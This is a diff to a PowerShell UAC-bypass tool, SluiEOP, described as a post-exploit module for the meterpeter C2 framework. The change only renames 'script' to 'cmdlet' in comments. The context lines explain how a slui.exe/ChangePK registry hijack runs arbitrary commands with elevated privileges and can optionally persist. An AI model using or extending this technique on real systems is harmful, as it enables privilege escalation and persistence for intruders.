@@ -7,7 +7,7 @@
    EOP Disclosure By: @mattharr0ey
    Required Dependencies: none
    Optional Dependencies: none
-   PS Script Dev Version: v1.9
+   PS cmdlet Dev Version: v1.9
 
 .DESCRIPTION
    How does Slui UAC bypass work? There is a tool named ChangePK in System32 has a service that opens a window (for you)
@@ -15,14 +15,14 @@
    activation key to a new one, the tool (ChangePK) doesn’t open itself with high privilege but there is another tool opens
    ChangePK with high privileges named sliu.exe Slui doesn’t support a feature that runs it as administrator automatically,
    but we can do that manually by either clicking on slui with a right click and click on “Run as administrator” or using:
-   powershell.exe Start-Process "C:\Windows\System32\slui.exe" -verb runas (SluiEOP PS script automates all of this tasks).
+   powershell.exe Start-Process "C:\Windows\System32\slui.exe" -verb runas (SluiEOP PS cmdlet automates all of this tasks).
 
 .NOTES
-   SluiEOP script was written to be one meterpeter C2 post-exploit module.
-   SluiEOP script supports [ CMD | POWERSHELL | PYTHON ] scripts execution.
+   SluiEOP cmdlet was written to be one meterpeter C2 post-exploit module.
+   SluiEOP cmdlet supports [ CMD | POWERSHELL | PYTHON ] scripts execution.
    To run child binarys (.exe) through this cmdlet use: cmd /c start bin.exe
 
-   This script 'reverts' regedit hacks to the previous state before the EOP.
+   This cmdlet 'reverts' regedit hacks to the previous state before the EOP.
    Unless '$MakeItPersistence' its set to "True". In that case the EOP registry
    hacks will NOT be deleted in the end of exec making the '$Command' persistence.
    [Remark: .\SluiEOP.ps1 "deleteEOP" argument can be used to delete persistence].
@@ -57,7 +57,7 @@
 
 
 $Command = $Null               # Command Internal function [<dontchange>]
-$DebugMode = "False"           # Change this value to "True" to debug script
+$DebugMode = "False"           # Change this value to "True" to debug cmdlet
 $EOP_Success = $False          # Remote execution Status [<dontchange>]
 $MakeItPersistence = "False"   # Change this value to "True" to persiste $Command
 $param1 = $args[0]             # User Inputs [ <arguments> ] [<dontchange>]
@@ -124,7 +124,7 @@ If($CheckVuln -eq $True){
 
    Start-Sleep -Milliseconds 2700 # Give time for Slui.exe to finish
    ## If $MakeItPersistence is set to "False" then the EOP registry hacks will NOT
-   # be deleted in the end of script execution, making the 'command' persistence.
+   # be deleted in the end of cmdlet execution, making the 'command' persistence.
    If($MakeItPersistence -eq "False"){
       ## Revert Regedit to 'DEFAULT' settings after EOP finished ..
       Write-Host "[+] Deleting  => EOP registry hacks (revert)"
